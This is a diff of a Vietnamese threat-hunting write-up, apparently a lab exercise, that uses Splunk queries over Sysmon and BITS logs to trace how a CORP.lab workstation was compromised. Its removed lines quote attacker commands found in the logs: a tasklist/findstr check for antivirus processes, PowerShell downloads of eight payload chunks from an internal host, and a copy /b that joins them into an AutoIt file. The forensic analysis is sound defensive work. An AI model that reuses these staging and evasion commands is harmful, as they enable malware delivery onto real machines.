@@ -34,7 +34,7 @@ index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCod
 
 ### 1.0. Phát hiện hoạt động bất thường
 
-Theo mô tả tình huống, đội ngũ SOC của CORP.lab phát hiện các executable được khởi chạy từ vị trí bất thường và những kết nối đến port không thường gặp từ máy trạm của một kĩ sư. Vì vậy, bước đầu tiên là lọc các sự kiện sysmon event id 3 trên PC01 để xác định các Image có vị trị khác thường và kết nối đáng ngờ.
+Theo mô tả tình huống, đội ngũ SOC của CORP.lab phát hiện các executable được khởi chạy từ vị trí bất thường và những kết nối đến port không thường gặp từ máy trạm của một kĩ sư. Vì vậy, bước đầu tiên là lọc các sự kiện sysmon event id 3 trên PC01 để xác định các Image có kết nối mạng và vị trí khác thường:  
 
 ```spl
 index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" host="PC01" EventCode=3
@@ -243,7 +243,7 @@ index=main host="PC01" Hose.cmd
 
 ![](images/image16.png)
 
-Các log tìm theo chuỗi `Hose.cmd` cho thấy hoạt động liên quan tới BITS, nhiều khả năng hiệu script powershell đăng ký bits job để tải payload
+Lọc các event log theo chuỗi `Hose.cmd` cho thấy hoạt động liên quan tới BITS, nhiều khả năng script powershell ban đầu đã đăng ký bits job để tải payload
 
 ```spl
 index=main source="XmlWinEventLog:Microsoft-Windows-Bits-Client/Operational" host="PC01" earliest="08/04/2025:18:38:00" latest="08/04/2025:18:40:00" EventCode=3
@@ -252,7 +252,7 @@ index=main source="XmlWinEventLog:Microsoft-Windows-Bits-Client/Operational" hos
 
 ![](images/image17.png)
 
-Vào 2025-08-04 18:39:16, event id 3 (BITS-Client Operational ) ghi nhận process powershell (PID = 14824) tạo 1 bít job với ID `{7ba6e4a1-e21c-4541-a68f-f76402b1d034}`.
+Vào 2025-08-04 18:39:16, event id 3 (BITS-Client Operational ) ghi nhận process powershell (PID = 14824) tạo 1 bits job với ID `{7ba6e4a1-e21c-4541-a68f-f76402b1d034}`.
 
 ```spl
 index=main source="XmlWinEventLog:Microsoft-Windows-Bits-Client/Operational" host="PC01" earliest="08/04/2025:18:38:00" latest="08/04/2025:18:40:00" EventCode=16403 jobId={7ba6e4a1-e21c-4541-a68f-f76402b1d034}
@@ -272,7 +272,7 @@ index=main source="XmlWinEventLog:Microsoft-Windows-Bits-Client/Operational" hos
 
 ![](images/image19.png)
 
-BITS Event ID 4 ghi nhận job hoàn thành việc tải script `Hose.cmd` lúc 2025-08-04 18:39:16, với độ lớn của tệp được xác định qua trường `bytesTransferred=1622`. Kết hợp việc `cmd.exe` được khởi chạy cùng thời điểm, các sự kiện này hỗ trợ việc tệp được tải và được thực thi ngay lập tức.
+BITS Event ID 4 ghi nhận job hoàn thành việc tải script `Hose.cmd` lúc 2025-08-04 18:39:16, với độ lớn của tệp được xác định qua trường `bytesTransferred=1622`. Kết hợp việc `cmd.exe` được khởi chạy cùng thời điểm, các sự kiện này cho thấy script được tải và thực thi ngay lập tức.
 
 ### 1.5. Thực thi script `Hose.cmd` 
 
@@ -301,28 +301,6 @@ index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" host="PC
 ![](images/image22.png)
 
 Chạy các lệnh sau (tất cả đều chạy dưới danh tính william với integrity level = High):
-
-- **2025-08-04 18:39:17** — `findstr  /I "wrsa opssvc"`
-- **2025-08-04 18:39:17** — `tasklist`
-Hai process `tasklist` và `findstr` được khởi chạy cùng thời điểm, phù hợp với pipeline `tasklist | findstr /I "wrsa opssvc"`. Mục đích là kiểm tra sự hiện diện của những process thuộc phần mềm bảo mật.
-
-- wrsa.exe: là tệp/process thực thi của phần mềm diệt virus Webroot SecureAnywhere phát triển bởi WebRoot
-
-- opssvc.exe: Là process dịch vụ nền của phần mềm bảo mật Quick Heal Antivirus
-
-Việc tìm `wrsa` (Webroot SecureAnywhere) và `opssvc` (Quick Heal) cho thấy script có bước kiểm tra security software. Chưa biết nếu tìm thấy các process này thì script sẽ dừng, trì hoãn hay thay đổi cách thực thi vì không có toàn bộ nội dung `Hose.cmd`.
-
-- **2025-08-04 18:39:18** — `powershell  -Command "Invoke-WebRequest -Uri 'http://10.10.5.199/payload/Italy' -OutFile '..\Italy'"`
-- **2025-08-04 18:39:19** — `powershell  -Command "Invoke-WebRequest -Uri 'http://10.10.5.199/payload/Holmes' -OutFile '..\Holmes'"`
-- **2025-08-04 18:39:20** — `powershell  -Command "Invoke-WebRequest -Uri 'http://10.10.5.199/payload/Lying' -OutFile '..\Lying'"`
-- **2025-08-04 18:39:20** — `powershell  -Command "Invoke-WebRequest -Uri 'http://10.10.5.199/payload/True' -OutFile '..\True'"`
-- **2025-08-04 18:39:21** — `powershell  -Command "Invoke-WebRequest -Uri 'http://10.10.5.199/payload/Responded' -OutFile '..\Responded'"`
-- **2025-08-04 18:39:22** — `powershell  -Command "Invoke-WebRequest -Uri 'http://10.10.5.199/payload/Fa' -OutFile '..\Fa'"`
-- **2025-08-04 18:39:22** — `powershell  -Command "Invoke-WebRequest -Uri 'http://10.10.5.199/payload/Proc' -OutFile '..\Proc'"`
-- **2025-08-04 18:39:23** — `powershell  -Command "Invoke-WebRequest -Uri 'http://10.10.5.199/payload/Ink' -OutFile '..\Ink'"`
-- **2025-08-04 18:39:24** — `cmd  /c copy /b ..\Italy + ..\Holmes + ..\True + ..\Lying + ..\Responded + ..\Proc + ..\Fa + ..\Ink suggests.a3x`
-Các lệnh `Invoke-WebRequest` tải tám phần từ `http://10.10.5.199/payload/`, sau đó `copy /b` ghép chúng theo thứ tự vào `suggests.a3x`. Phần mở rộng `.a3x` gợi ý một compiled AutoIt script, nhưng không đủ để xác nhận file type hoặc nội dung nếu không có payload để phân tích.
-
 
 | Thời gian | Lệnh | Mô tả |
 |---|---|---|
@@ -369,7 +347,7 @@ index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" host="PC
 
 ![](images/image25.png)
 
-Vào 2025-08-04 18:40:15, sysmon event id 22 ghi nhận process `set-up.exe` thực hiện DNS query liên quan đến DC01/CORP.lab. Điều này phù hợp với hoạt động xác định địa chỉ của Domain Controller.
+Vào 2025-08-04 18:40:15, sysmon event id 22 ghi nhận process `set-up.exe` thực hiện DNS query liên quan đến DC01/CORP.lab. Điều này cho thấy hoạt động xác định địa chỉ của Domain Controller nhằm recon hoặc chuẩn bị lateral movement.
 
 ```spl
 index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" host="PC01" earliest="08/04/2025:18:39:15" process_id=8500 ({00000000-0000-0000-0000-000000000000} OR {c73af8d8-fe53-6890-2010-000000005200}) EventCode=11
